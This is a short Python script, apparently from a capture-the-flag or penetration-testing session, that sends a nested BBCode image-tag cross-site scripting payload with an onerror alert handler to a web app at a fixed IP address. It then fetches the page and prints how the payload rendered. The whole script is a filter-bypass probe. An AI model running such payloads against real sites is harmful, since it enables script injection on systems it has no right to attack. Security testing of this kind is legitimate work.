import time, urllib.request, urllib.parse
BASE = "http://160.202.254.160:15880/"
PROXY = {"http": "http://127.0.0.1:12001", "https": "http://127.0.0.1:12001"}
op = urllib.request.build_opener(urllib.request.ProxyHandler(PROXY))

def get(data=None):
    d = urllib.parse.urlencode(data).encode() if data is not None else None
    with op.open(BASE, data=d, timeout=20) as r:
        return r.read().decode("gb18030", "replace")

MARK = "ESC9"
payload = "[/img][img]x[img]onerror=alert`1` [/img]" + MARK
print("SENT:", payload)
get({"content": payload})
time.sleep(0.3)
body = get()
i = body.find(MARK)
start = body.rfind("<pre>", 0, i)
print("\n渲染结果(raw):")
print(repr(body[start:i+len(MARK)]))
